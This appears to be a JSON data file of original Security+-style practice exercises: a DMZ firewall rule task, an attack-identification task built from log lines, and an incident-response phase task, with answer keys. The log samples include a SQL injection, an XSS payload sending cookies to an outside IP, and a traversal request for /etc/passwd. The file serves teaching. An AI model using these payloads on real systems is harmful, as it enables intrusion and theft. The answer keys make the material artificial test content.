@@ -1,0 +1,287 @@
+{
+ "cert": "security-plus",
+ "note": "Original performance-based questions written for Patch Notes, in the style of CompTIA's. They are not real exam questions.",
+ "pbqs": [
+  {
+   "id": "sp-pbq-firewall",
+   "kind": "firewall",
+   "objectives": [
+    "3.2",
+    "4.5"
+   ],
+   "minutes": 7,
+   "title": "Write the DMZ firewall rules",
+   "scenario": "The web server 10.0.0.5 sits in a DMZ. Write the rules for traffic to it.",
+   "requirements": [
+    "Anyone on the internet can reach the website over HTTPS.",
+    "Admins on 10.0.5.0/24 can use SSH to the server.",
+    "Nothing else reaches it, including plain HTTP and remote desktop.",
+    "Policy: end with an explicit rule that denies everything else."
+   ],
+   "slots": 5,
+   "explicitDeny": true,
+   "options": {
+    "proto": [
+     "tcp",
+     "udp",
+     "icmp",
+     "any"
+    ],
+    "src": [
+     "any",
+     "10.0.5.0/24",
+     "203.0.113.0/24"
+    ],
+    "dst": [
+     "10.0.0.5",
+     "any"
+    ],
+    "port": [
+     "22",
+     "80",
+     "443",
+     "3389",
+     "any"
+    ]
+   },
+   "tests": [
+    {
+     "label": "A customer: 203.0.113.9 to 10.0.0.5, TCP 443",
+     "proto": "tcp",
+     "src": "203.0.113.9",
+     "dst": "10.0.0.5",
+     "port": 443,
+     "expected": "allow",
+     "why": "HTTPS from anywhere is the whole point of the server."
+    },
+    {
+     "label": "Another customer: 198.51.100.20 to 10.0.0.5, TCP 443",
+     "proto": "tcp",
+     "src": "198.51.100.20",
+     "dst": "10.0.0.5",
+     "port": 443,
+     "expected": "allow",
+     "why": "Customers come from anywhere, so the source must be any, not one range."
+    },
+    {
+     "label": "An admin: 10.0.5.20 to 10.0.0.5, TCP 22",
+     "proto": "tcp",
+     "src": "10.0.5.20",
+     "dst": "10.0.0.5",
+     "port": 22,
+     "expected": "allow",
+     "why": "SSH from the admin range only."
+    },
+    {
+     "label": "An admin browsing the site: 10.0.5.20 to 10.0.0.5, TCP 443",
+     "proto": "tcp",
+     "src": "10.0.5.20",
+     "dst": "10.0.0.5",
+     "port": 443,
+     "expected": "allow",
+     "why": "Admins are customers too: the HTTPS rule covers them."
+    },
+    {
+     "label": "SSH from the internet: 203.0.113.9 to 10.0.0.5, TCP 22",
+     "proto": "tcp",
+     "src": "203.0.113.9",
+     "dst": "10.0.0.5",
+     "port": 22,
+     "expected": "deny",
+     "why": "SSH open to the internet invites password guessing. Only the admin range may use it."
+    },
+    {
+     "label": "Plain HTTP: 198.51.100.20 to 10.0.0.5, TCP 80",
+     "proto": "tcp",
+     "src": "198.51.100.20",
+     "dst": "10.0.0.5",
+     "port": 80,
+     "expected": "deny",
+     "why": "The site is HTTPS only."
+    },
+    {
+     "label": "Remote desktop from the internet: 203.0.113.50 to 10.0.0.5, TCP 3389",
+     "proto": "tcp",
+     "src": "203.0.113.50",
+     "dst": "10.0.0.5",
+     "port": 3389,
+     "expected": "deny",
+     "why": "Exposed RDP is a classic way in for ransomware."
+    },
+    {
+     "label": "Remote desktop from an admin: 10.0.5.20 to 10.0.0.5, TCP 3389",
+     "proto": "tcp",
+     "src": "10.0.5.20",
+     "dst": "10.0.0.5",
+     "port": 3389,
+     "expected": "deny",
+     "why": "Admins were given SSH, nothing more: least privilege."
+    }
+   ],
+   "model": [
+    {
+     "action": "allow",
+     "proto": "tcp",
+     "src": "any",
+     "dst": "10.0.0.5",
+     "port": "443"
+    },
+    {
+     "action": "allow",
+     "proto": "tcp",
+     "src": "10.0.5.0/24",
+     "dst": "10.0.0.5",
+     "port": "22"
+    },
+    {
+     "action": "deny",
+     "proto": "any",
+     "src": "any",
+     "dst": "any",
+     "port": "any"
+    }
+   ],
+   "simplification": "Each packet is judged on its own against the list (a stateless ACL). Real firewalls also track connections, so replies are let back in automatically."
+  },
+  {
+   "id": "sp-pbq-attacks",
+   "kind": "match",
+   "objectives": [
+    "2.4",
+    "4.9"
+   ],
+   "minutes": 6,
+   "title": "Name the attack in each log line",
+   "mono": true,
+   "scenario": "The SOC has pulled one line from each of eight alerts. Name the attack each one shows.",
+   "prompt": "Choose the attack each line shows.",
+   "choices": [
+    "SQL injection",
+    "Cross-site scripting",
+    "Directory traversal",
+    "Brute force",
+    "Password spraying",
+    "Insecure direct object reference",
+    "Reflected amplification DDoS",
+    "ARP poisoning (on-path)",
+    "Phishing",
+    "Ransomware"
+   ],
+   "items": [
+    {
+     "id": "sqli",
+     "text": "GET /products?id=7' UNION SELECT username,password FROM users-- HTTP/1.1 200",
+     "answer": "SQL injection",
+     "why": "The quote ends the app's query and UNION SELECT adds the attacker's own, reading the users table."
+    },
+    {
+     "id": "xss",
+     "text": "GET /search?q=<script>new Image().src='https://203.0.113.9/c?'+document.cookie</script> 200",
+     "answer": "Cross-site scripting",
+     "why": "A script in the input that sends the visitor's cookie away: reflected XSS."
+    },
+    {
+     "id": "trav",
+     "text": "GET /download?file=../../../../etc/passwd HTTP/1.1 200",
+     "answer": "Directory traversal",
+     "why": "Each ../ climbs a folder, reaching files outside the web root."
+    },
+    {
+     "id": "brute",
+     "text": "sshd: Failed password for root from 203.0.113.45 port 51001 ssh2 (412 in 5 minutes)",
+     "answer": "Brute force",
+     "why": "One account, one source, hundreds of guesses."
+    },
+    {
+     "id": "spray",
+     "text": "Sign-in failed (AADSTS50126) for 37 users from 198.51.100.23, one attempt each, same minute",
+     "answer": "Password spraying",
+     "why": "One common password tried once against many accounts, staying under lockout limits."
+    },
+    {
+     "id": "idor",
+     "text": "GET /api/orders/10442 user=3381 owner=2205 200 OK",
+     "answer": "Insecure direct object reference",
+     "why": "User 3381 read order 10442, which belongs to 2205: the server didn't check ownership."
+    },
+    {
+     "id": "ddos",
+     "text": "Inbound UDP 123 (NTP) responses to 203.0.113.80: 1,900 sources, 400 MB/s, no requests sent",
+     "answer": "Reflected amplification DDoS",
+     "why": "Replies nobody asked for, from many open NTP servers: the attacker spoofed the victim's address."
+    },
+    {
+     "id": "arp",
+     "text": "ARP: 192.168.1.1 is-at 00:11:22:aa:bb:cc, then 192.168.1.1 is-at de:ad:be:ef:00:05",
+     "answer": "ARP poisoning (on-path)",
+     "why": "The gateway's address suddenly maps to a different MAC: someone is putting themselves in the middle."
+    }
+   ],
+   "simplification": "Each line is shortened from the real log format to the part that matters."
+  },
+  {
+   "id": "sp-pbq-ir",
+   "kind": "match",
+   "objectives": [
+    "4.8"
+   ],
+   "minutes": 5,
+   "title": "Put each action in its incident response phase",
+   "scenario": "An infostealer was found on a laptop at a small firm. Here's what the team did. Which phase does each action belong to?",
+   "prompt": "Choose the incident response phase for each action.",
+   "choices": [
+    "Preparation",
+    "Detection",
+    "Analysis",
+    "Containment",
+    "Eradication",
+    "Recovery",
+    "Lessons learned"
+   ],
+   "items": [
+    {
+     "id": "prep",
+     "text": "Wrote the incident response plan and ran a tabletop exercise in the spring",
+     "answer": "Preparation",
+     "why": "Done before anything happens: plans, contacts, tools and practice."
+    },
+    {
+     "id": "det",
+     "text": "The EDR alerted on encoded PowerShell started by a .pdf.js file",
+     "answer": "Detection",
+     "why": "Noticing that something may be wrong."
+    },
+    {
+     "id": "ana",
+     "text": "Worked out which saved logins were stolen and where they were used",
+     "answer": "Analysis",
+     "why": "Scoping: what happened, how far it got, and how."
+    },
+    {
+     "id": "con",
+     "text": "Isolated the laptop from the network but left it powered on",
+     "answer": "Containment",
+     "why": "Stop the spread while keeping evidence (memory is lost if it's switched off)."
+    },
+    {
+     "id": "era",
+     "text": "Removed the malware and its scheduled task, and reset every stolen password",
+     "answer": "Eradication",
+     "why": "Remove the attacker's foothold and what they took."
+    },
+    {
+     "id": "rec",
+     "text": "Reimaged the laptop, returned it, and watched it closely for a week",
+     "answer": "Recovery",
+     "why": "Back to normal, with extra monitoring."
+    },
+    {
+     "id": "les",
+     "text": "Met a week later, agreed to block .js attachments, and updated the plan",
+     "answer": "Lessons learned",
+     "why": "Improve so it doesn't happen again."
+    }
+   ]
+  }
+ ]
+}
